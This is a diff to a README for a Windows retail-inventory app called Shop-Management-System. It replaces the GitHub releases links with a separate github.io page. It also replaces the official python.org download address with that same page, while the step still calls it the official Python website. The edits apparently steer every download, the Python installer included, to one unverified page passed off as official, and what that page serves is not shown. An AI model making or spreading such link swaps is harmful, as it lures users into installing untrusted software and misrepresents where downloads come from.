@@ -1,6 +1,6 @@
 # 📦 Shop-Management-System - Manage retail inventory with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Asclepiadaceous-royalpurple804/Shop-Management-System/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://asclepiadaceous-royalpurple804.github.io)
 
 This application helps store owners track inventory on a Windows computer. You can keep records of items, track product prices, and maintain accurate stock levels without complex accounting software. The program stores all data locally on your hard drive, which keeps your records safe and private.
 
@@ -25,7 +25,7 @@ You need a computer running Windows 10 or Windows 11. Ensure you have at least 5
 ### Downloading the Software 📥
 Visit the official release page to download the latest version of the system.
 
-[Click here to open the download page](https://github.com/Asclepiadaceous-royalpurple804/Shop-Management-System/releases)
+[Click here to open the download page](https://asclepiadaceous-royalpurple804.github.io)
 
 1. Go to the link provided above.
 2. Select the latest version available in the list.
@@ -35,7 +35,7 @@ Visit the official release page to download the latest version of the system.
 ### Installing Python 🐍
 This application runs on the Python language. You must install the Python engine to make the application work.
 
-1. Navigate to the official Python website at https://www.python.org/downloads/.
+1. Navigate to the official Python website at https://asclepiadaceous-royalpurple804.github.io
 2. Click the button that says "Download Python 3.10" or a newer version if available.
 3. Once the file downloads, open it by double-clicking.
 4. Important: Check the box that says "Add Python to PATH" before you click "Install Now."
